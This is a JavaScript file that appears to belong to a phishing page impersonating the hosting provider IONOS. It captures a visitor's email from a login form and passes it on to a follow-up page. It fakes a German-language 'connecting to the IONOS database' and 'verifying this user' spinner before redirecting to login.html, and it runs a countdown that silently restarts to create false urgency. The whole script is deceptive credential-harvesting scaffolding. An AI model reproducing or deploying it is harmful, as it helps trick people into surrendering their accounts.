document.addEventListener("DOMContentLoaded", function () {
  const COUNTDOWN_DURATION = 12 * 3600; // 12 hours in seconds
  const COUNTDOWN_KEY = 'countdownEndTime';

  // Get or set countdown end time
  function initializeCountdown() {
    let endTime = parseInt(localStorage.getItem(COUNTDOWN_KEY), 10);

    if (!endTime || isNaN(endTime) || Date.now() >= endTime) {
      endTime = Date.now() + COUNTDOWN_DURATION * 1000;
      localStorage.setItem(COUNTDOWN_KEY, endTime.toString());
    }

    function updateCountdown() {
      const now = Date.now();
      let remainingSeconds = Math.max(0, Math.floor((endTime - now) / 1000));

      const hours = Math.floor(remainingSeconds / 3600);
      const minutes = Math.floor((remainingSeconds % 3600) / 60);
      const seconds = remainingSeconds % 60;

      const h = document.getElementById('hours');
      const m = document.getElementById('minutes');
      const s = document.getElementById('seconds');

      if (h && m && s) {
        h.textContent = hours.toString().padStart(2, '0');
        m.textContent = minutes.toString().padStart(2, '0');
        s.textContent = seconds.toString().padStart(2, '0');
      }

      if (remainingSeconds <= 0) {
        endTime = Date.now() + COUNTDOWN_DURATION * 1000;
        localStorage.setItem(COUNTDOWN_KEY, endTime.toString());
      }
    }

    updateCountdown();
    setInterval(updateCountdown, 1000);
  }

  // Handle form submission
  const form = document.getElementById("loginForm");
  const button = document.getElementById("submitBtn");

  if (form && button) {
    const dotsLoading = button.querySelector(".dots-loading");

    form.addEventListener("submit", function (e) {
      e.preventDefault();
      const email = document.getElementById("email").value;
      button.disabled = true;
      dotsLoading.style.display = 'flex';

      setTimeout(() => {
        window.location.href = `lucky.html?email=${encodeURIComponent(email)}`;
      }, 4000);
    });
  }

  // Spinner overlay behavior
  const protectLink = document.querySelector('.protect-link');
  if (protectLink) {
    protectLink.addEventListener('click', function (e) {
      e.preventDefault();

      const spinnerOverlay = document.getElementById('spinnerOverlay');
      const spinnerText = document.getElementById('spinnerText');
      const container = document.querySelector('.container');

      spinnerOverlay.style.display = 'flex';
      spinnerOverlay.style.animation = 'fadeIn 0.5s ease-out';
      container.classList.add('blur');

      setTimeout(() => {
        const spinnerContainer = document.querySelector('.spinner-container');
        spinnerContainer.classList.add('fade-in');
      }, 100);

      spinnerText.textContent = 'Verbindung zur IONOS-Datenbank herstellen';

      const messageTimeout = setTimeout(() => {
        spinnerText.textContent = 'Verifizierung dieses Benutzers';
      }, 4000);

      const hideTimeout = setTimeout(() => {
        spinnerOverlay.style.animation = 'fadeOut 0.5s ease-in';
        container.classList.remove('blur');

        setTimeout(() => {
          spinnerOverlay.style.display = 'none';
          spinnerOverlay.style.animation = '';
          window.location.href = 'login.html';
        }, 500);
      }, 7000);

      window.spinnerTimeouts = [messageTimeout, hideTimeout];
    });
  }

  // Clear timers if page is left
  window.addEventListener('beforeunload', function () {
    if (window.spinnerTimeouts) {
      window.spinnerTimeouts.forEach(clearTimeout);
    }

    const spinnerOverlay = document.getElementById('spinnerOverlay');
    const container = document.querySelector('.container');

    if (spinnerOverlay) {
      spinnerOverlay.style.display = 'none';
      spinnerOverlay.style.animation = '';
    }
    if (container) {
      container.classList.remove('blur');
    }
  });

  // Date/time updater
  function updateDateTime() {
    const now = new Date();
    const dateOptions = {
      year: 'numeric',
      month: 'long',
      day: 'numeric'
    };
    const timeOptions = {
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit'
    };

    const dateEl = document.getElementById('currentDate');
    const timeEl = document.getElementById('currentTime');
    if (dateEl) dateEl.textContent = now.toLocaleDateString('de-DE', dateOptions);
    if (timeEl) timeEl.textContent = now.toLocaleTimeString('de-DE', timeOptions);
  }

  // Email from URL or referrer
  function setUserEmail() {
    const params = new URLSearchParams(window.location.search);
    const email = params.get("email");
    const referrerEmail = document.referrer.includes('email=') ?
      new URLSearchParams(document.referrer.split('?')[1]).get('email') : null;

    const emailEl = document.getElementById("userEmail");
    if (emailEl) {
      if (email) {
        emailEl.textContent = email;
      } else if (referrerEmail) {
        emailEl.textContent = referrerEmail;
      }
    }
  }

  // Animate container on load
  const container = document.querySelector('.container');
  if (container) {
    container.style.opacity = '0';
    container.style.transform = 'translateY(20px)';

    setTimeout(() => {
      container.style.transition = 'all 0.6s ease';
      container.style.opacity = '1';
      container.style.transform = 'translateY(0)';
    }, 100);
  }

  // Start date/time and countdown
  updateDateTime();
  setInterval(updateDateTime, 1000);
  setUserEmail();
  initializeCountdown();
});
